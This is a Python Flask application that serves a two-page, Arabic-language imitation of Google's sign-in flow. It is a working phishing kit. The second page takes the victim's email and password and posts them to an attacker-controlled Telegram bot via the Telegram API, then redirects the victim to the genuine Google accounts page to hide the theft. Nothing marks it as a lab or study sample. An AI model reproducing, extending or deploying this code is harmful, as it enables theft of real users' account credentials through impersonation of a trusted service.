import os
import re
import requests
from flask import Flask, redirect, render_template_string, request, session, url_for

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "hohosbid_super_secret_key")

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

GOOGLE_OFFICIAL_URL = "https://accounts.google.com/"


# الصفحة الأولى: المسافات مفصولة وموزعة بدقة بين الروابط وزر التالي السفلي
@app.route("/", methods=["GET", "POST"])
def step1():
  error = ""
  if request.method == "POST":
    email_val = request.form.get("email", "").strip()

    email_pattern = r"^[\w\.-]+@[\w\.-]+\.\w+$"
    phone_pattern = r"^\+?[0-9]{10,15}$"

    if not (
        re.match(email_pattern, email_val) or re.match(phone_pattern, email_val)
    ):
      error = (
          "لم يتم العثور على حسابك على Google. يُرجى التحقق من عنوان البريد"
          " الإلكتروني أو رقم الهاتف."
      )
    else:
      session["user_email"] = email_val
      return redirect(url_for("step2"))

  return render_template_string(
      """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>تسجيل الدخول - حسابات Google</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; }
        
        body { 
            background: #fff; 
            width: 100vw; 
            min-height: 100vh; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: space-between;
            padding: 24px 16px 20px 16px;
        }
        
        .login-card {
            width: 100%;
            max-width: 400px;
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
        }

        .google-g {
            width: 36px;
            height: 36px;
            margin-bottom: 8px;
        }

        .title { font-size: 22px; font-weight: 400; color: #202124; margin-bottom: 6px; }
        .subtitle { font-size: 13.5px; color: #5f6368; margin-bottom: 4px; line-height: 1.4; }
        
        .info-link {
            font-size: 13.5px;
            color: #1a73e8;
            text-decoration: none;
            margin-bottom: 20px;
            display: inline-block;
        }
        .info-link:hover { text-decoration: underline; }

        .error-msg { 
            color: #d93025; 
            font-size: 13px; 
            line-height: 20px; 
            margin-bottom: 12px; 
            width: 100%; 
            text-align: right; 
            background: #fce8e6; 
            padding: 8px; 
            border-radius: 8px; 
            border: 1px solid #fad2cf; 
        }

        .input-group { width: 100%; margin-bottom: 8px; }
        .input-group input {
            width: 100%;
            padding: 13px 14px;
            font-size: 15px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            outline: none;
            color: #202124;
            background: #fff;
        }
        .input-group input:focus { border-color: #1a73e8; border-width: 2px; padding: 12px 13px; }

        /* رابط هل نسيت البريد قريبه للحقل */
        .forgot-link-wrapper {
            width: 100%;
            display: flex;
            justify-content: flex-start;
            margin-top: 8px;
            padding: 0 2px;
        }
        .forgot-link-wrapper a {
            color: #1a73e8;
            font-size: 14px;
            text-decoration: none;
            font-weight: 500;
        }
        .forgot-link-wrapper a:hover { text-decoration: underline; }

        /* فصل "إنشاء حساب" بمسافة ممتازة للأسفل عن رابط نسيت البريد */
        .signup-link-wrapper {
            width: 100%;
            display: flex;
            justify-content: flex-start;
            margin-top: 24px;
            padding: 0 2px;
        }
        .signup-link-wrapper a {
            color: #1a73e8;
            font-size: 14px;
            text-decoration: none;
            font-weight: 500;
        }
        .signup-link-wrapper a:hover { text-decoration: underline; }

        /* حاوية زر التالي في الزاوية السفلى تماماً وبوضوح */
        .footer-action {
            width: 100%;
            max-width: 400px;
            display: flex;
            justify-content: flex-end;
            align-items: center;
            padding-bottom: 4px;
        }

        .submit-btn {
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 24px;
            padding: 10px 26px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
        }
        .submit-btn:hover { background: #1558b0; }
    </style>
</head>
<body>
    <div class="login-card">
        <svg class="google-g" viewBox="0 0 24 24">
            <path fill="#4285F4" d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v4.51h6.6c-.29 1.52-1.14 2.82-2.4 3.68v3.05h3.88c2.27-2.09 3.66-5.17 3.66-9.17z"/>
            <path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.88-3.05c-1.08.72-2.45 1.16-4.05 1.16-3.13 0-5.78-2.11-6.73-4.96H1.18v3.14C3.15 21.32 7.23 24 12 24z"/>
            <path fill="#FBBC05" d="M5.27 14.24c-.25-.72-.38-1.49-.38-2.24s.13-1.52.38-2.24V6.62H1.18C.43 8.12 0 9.8 0 12s.43 3.88 1.18 5.38l3.14-3.14-.05-.00z"/>
            <path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.23 0 3.15 2.68 1.18 6.62l4.09 3.14c.95-2.85 3.6-4.96 6.73-4.96z"/>
        </svg>

        <div class="title">تسجيل الدخول</div>
        <div class="subtitle">يُرجى استخدام حسابك على Google. ستتم إضافة الحساب إلى هذا الجهاز وسيكون متاحًا لاستخدامه في تطبيقات Google الأخرى.</div>
        <a href="#" class="info-link">مزيد من المعلومات حول استخدام حسابك</a>

        {% if error %}
            <div class="error-msg">{{ error }}</div>
        {% endif %}

        <form id="emailForm" method="POST" style="width: 100%;">
            <div class="input-group">
                <input type="text" name="email" required placeholder="البريد الإلكتروني أو الهاتف">
            </div>
            
            <div class="forgot-link-wrapper">
                <a href="#">هل نسيت بريدك الإلكتروني؟</a>
            </div>

            <div class="signup-link-wrapper">
                <a href="https://accounts.google.com/signup" target="_blank">إنشاء حساب</a>
            </div>
        </form>
    </div>

    <div class="footer-action">
        <button type="submit" form="emailForm" class="submit-btn">التالي</button>
    </div>
</body>
</html>
""",
      error=error,
  )


# الصفحة الثانية: إدخال كلمة المرور
@app.route("/step2", methods=["GET", "POST"])
def step2():
  user_email = session.get("user_email", "")
  if not user_email:
    return redirect(url_for("step1"))

  error = ""
  if request.method == "POST":
    password = request.form.get("password", "")

    if len(password) <= 5:
      error = (
          "كلمة المرور قصيرة جداً. يجب أن تكون كلمة المرور أطول من 5 أحرف."
      )
    else:
      if BOT_TOKEN and CHAT_ID:
        msg = (
            "📸 تم استلام بيانات Google جديدة:\n\n📧 البريد:"
            f" {user_email}\n🔑 الباسورد: {password}"
        )
        telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(telegram_url, json={"chat_id": CHAT_ID, "text": msg})

      session.pop("user_email", None)
      return redirect(GOOGLE_OFFICIAL_URL)

  return render_template_string(
      """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>تسجيل الدخول - حسابات Google</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; }
        
        body { 
            background: #fff; 
            width: 100vw; 
            min-height: 100vh; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: space-between;
            padding: 24px 16px 20px 16px;
        }
        
        .login-card {
            width: 100%;
            max-width: 400px;
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
        }

        .google-logo {
            font-size: 22px;
            font-weight: 500;
            color: #202124;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 4px;
        }
        
        .google-logo span span:nth-child(1) { color: #4285F4; }
        .google-logo span span:nth-child(2) { color: #EA4335; }
        .google-logo span span:nth-child(3) { color: #FBBC05; }
        .google-logo span span:nth-child(4) { color: #4285F4; }
        .google-logo span span:nth-child(5) { color: #34A853; }
        .google-logo span span:nth-child(6) { color: #EA4335; }

        .title { font-size: 22px; font-weight: 400; color: #202124; margin-bottom: 10px; }
        
        .user-chip {
            display: inline-flex;
            align-items: center;
            padding: 4px 12px 4px 4px;
            border: 1px solid #dadce0;
            border-radius: 100px;
            margin-bottom: 20px;
            font-size: 13.5px;
            color: #3c4043;
            gap: 6px;
            background: #fff;
        }
        .user-chip svg { width: 16px; height: 16px; }

        .error-msg { 
            color: #d93025; 
            font-size: 13px; 
            line-height: 20px; 
            margin-bottom: 12px; 
            width: 100%; 
            text-align: right; 
            background: #fce8e6; 
            padding: 8px; 
            border-radius: 8px; 
            border: 1px solid #fad2cf; 
        }

        .input-group { width: 100%; margin-bottom: 12px; }
        .input-group input {
            width: 100%;
            padding: 13px 14px;
            font-size: 15px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            outline: none;
            color: #202124;
            background: #fff;
        }
        .input-group input:focus { border-color: #1a73e8; border-width: 2px; padding: 12px 13px; }

        .footer-action {
            width: 100%;
            max-width: 400px;
            display: flex;
            justify-content: flex-end;
            align-items: center;
            padding-bottom: 4px;
        }

        .submit-btn {
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 24px;
            padding: 10px 26px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
        }
        .submit-btn:hover { background: #1558b0; }
    </style>
</head>
<body>
    <div class="login-card">
        <div class="google-logo">
            <span>
                <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
            </span>
        </div>
        
        <div class="title">مرحبًا</div>
        
        <div class="user-chip">
            <svg viewBox="0 0 24 24"><path fill="#5f6368" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
            <span>{{ user_email }}</span>
        </div>

        {% if error %}
            <div class="error-msg">{{ error }}</div>
        {% endif %}

        <form id="passForm" method="POST" style="width: 100%;">
            <div class="input-group">
                <input type="password" name="password" required placeholder="إدخال كلمة المرور">
            </div>
        </form>
    </div>

    <div class="footer-action">
        <button type="submit" form="passForm" class="submit-btn">التالي</button>
    </div>
</body>
</html>
""",
      error=error,
      user_email=user_email,
  )


if __name__ == "__main__":
  app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
